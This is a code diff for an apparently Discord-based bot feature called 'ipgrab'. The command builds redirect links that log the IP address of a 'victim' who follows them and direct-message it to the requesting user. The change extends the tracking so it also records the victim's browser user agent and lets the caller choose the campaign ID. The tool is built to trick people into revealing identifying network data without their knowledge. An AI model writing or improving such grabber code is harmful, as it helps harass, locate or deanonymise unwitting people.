@@ -22,14 +22,16 @@ logger: Logger = getLogger(__name__)
 class LoggedEvent:
     """A logged redirector event."""
 
-    def __init__(self, link_id: str, redirected_to: str, redirected_at: datetime, remote: str, document: Document):
+    def __init__(self, link_id: str, redirected_to: str, redirected_at: datetime, remote: str,
+                 user_agent: Optional[str], *, document: Document):
         self.link_id: str = link_id
         self.redirected_to: str = redirected_to
         self.redirected_at: datetime = redirected_at
         self.remote: str = remote
         self.document: Document = document
+        self.user_agent: Optional[str] = user_agent
 
-    __slots__ = ('link_id', 'redirected_to', 'redirected_at', 'remote', 'document')
+    __slots__ = ('link_id', 'redirected_to', 'redirected_at', 'remote', 'document', 'user_agent')
 
 
 async def get_listen_doc(collection: AsyncIOMotorCollection, link_id: str) -> Document:
@@ -78,7 +80,8 @@ class Redirector(Cog):
                                         entry["redirected_to"],
                                         timestamp,
                                         entry["remote"],
-                                        document,
+                                        entry.get("user_agent"),
+                                        document=document,
                                     )
                                 )
 
@@ -111,26 +114,34 @@ class Redirector(Cog):
                     or await self.bot.fetch_user(listening_document["listening_user"])
             )
 
+            embed: Embed = (
+                Embed(
+                    title="Result",
+                    description=f"Regarding campaign ID `{logged_event.link_id}`"
+                )
+                    .add_field(
+                    name="Redirected to:",
+                    value=f"[{logged_event.redirected_to}]({logged_event.redirected_to})"
+                )
+                    .add_field(
+                    name="Redirected at:",
+                    value=f"<t:{floor((logged_event.redirected_at - UTC_OFFSET).timestamp())}>"
+                )
+                    .add_field(
+                    name="IP Address:",
+                    value=f"`{logged_event.remote}`"
+                )
+            )
+
+            if logged_event.user_agent is not None:
+                embed: Embed = embed.add_field(
+                    name="User Agent:",
+                    value=f"`{logged_event.user_agent}`"
+                )
+
             await listening_user.send(
                 "An IP address has been grabbed!",
-                embed=(
-                    Embed(
-                        title="Result",
-                        description=f"Regarding campaign ID `{logged_event.link_id}`"
-                    )
-                        .add_field(
-                        name="Redirected to:",
-                        value=f"[{logged_event.redirected_to}]({logged_event.redirected_to})"
-                    )
-                        .add_field(
-                        name="Redirected at:",
-                        value=f"<t:{floor((logged_event.redirected_at - UTC_OFFSET).timestamp())}>"
-                    )
-                        .add_field(
-                        name="IP Address:",
-                        value=f"`{logged_event.remote}`"
-                    )
-                )
+                embed=embed
             )
 
     @command()
@@ -160,13 +171,14 @@ class Redirector(Cog):
     async def ipgrab(
             self,
             ctx: CustomContext,
-            destination: str = Option(description="The URL to redirect the victim to.")
+            destination: str = Option(description="The URL to redirect the victim to."),
+            link_id: Optional[str] = Option(name="campaign_id", description="The campaign ID to listen to.")
     ) -> None:
         """Allows you to grab the IP address of a user by getting them to follow a link."""
 
         await ctx.defer(ephemeral=True)
 
-        link_id: str = random_string(length=6)
+        link_id: str = link_id or random_string(length=6)
 
         # Start listening
         listening_document: Document = await get_listen_doc(get_collection(self.bot), link_id)
